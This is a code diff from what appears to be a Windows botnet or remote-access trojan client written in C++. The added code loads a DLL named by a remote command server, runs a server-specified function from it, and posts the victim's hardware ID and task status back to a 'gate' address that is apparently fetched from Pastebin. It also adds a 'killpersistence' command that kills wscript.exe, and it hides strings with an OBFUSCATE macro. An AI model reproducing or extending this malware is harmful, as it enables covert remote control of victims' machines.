@@ -3,6 +3,7 @@
 #include <fstream>
 #include <hstring.h>
 
+
 struct ComInit
 {
 	HRESULT hr;
@@ -122,31 +123,17 @@ public:
 			
 					HINSTANCE hGetProcIDDLL = LoadLibrary(file.c_str());
 
-					if (!hGetProcIDDLL) {
-						std::cout << "could not load the dynamic library" << std::endl;
+					if (hGetProcIDDLL) {
+						//started = "loaded";
+						if (v[3] != "") {
+							func fn = (func)GetProcAddress(hGetProcIDDLL, (LPCSTR)v[3].c_str());
+							runningPlugin = std::thread(fn, v[4]);
+							//d::cout << "funci() returned " << funci() << std::endl;
+						}
+						started = "success";
 					}
+					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
 
-					if (v[3] != "" ) {
-						func fn = (func)GetProcAddress(hGetProcIDDLL, (LPCSTR)v[3].c_str());
-						runningPlugin = std::thread(fn,v[4]);
-						//d::cout << "funci() returned " << funci() << std::endl;
-					}
-
-					//postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
-					
-
-					/*
-					TODO
-					Workings with a Byte array of a Dll but download in Memory is not finished
-
-					CLoad lib;
-					HANDLE hLibrary = 0;
-					hLibrary = lib.LoadFromMemory(buffer, sizeof(buffer)); // loaded the dll from byte array.
-					func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "DisplayHelloFromDLL");
-					fn();
-					lib.FreeLibraryFromMemory(hLibrary);
-					*/
-				//	postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
 				}
 				else {
 					if (responseFromGate.find(OBFUSCATE("uninstall")) != std::string::npos) {
@@ -163,13 +150,19 @@ public:
 						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
 						Helpers::update(v[2]);
 						return;
+					} else if (responseFromGate.find(OBFUSCATE("killpersistence")) != std::string::npos) {
+						if (config.startup == "true") {
+							startupPersistence.detach();
+						}
+						Helpers::killProcessByName(OBFUSCATE("wscript.exe"));
 					}
 				}
 			}
 			catch (const std::exception & e) {
 				std::cerr << OBFUSCATE("Request failed, error: ") << e.what() << std::endl;
 			}
-			Sleep(10000);
+			int requestInterval = std::stoi(config.requestInterval);
+			Sleep(requestInterval * 1000);
 		}
 	}
 };
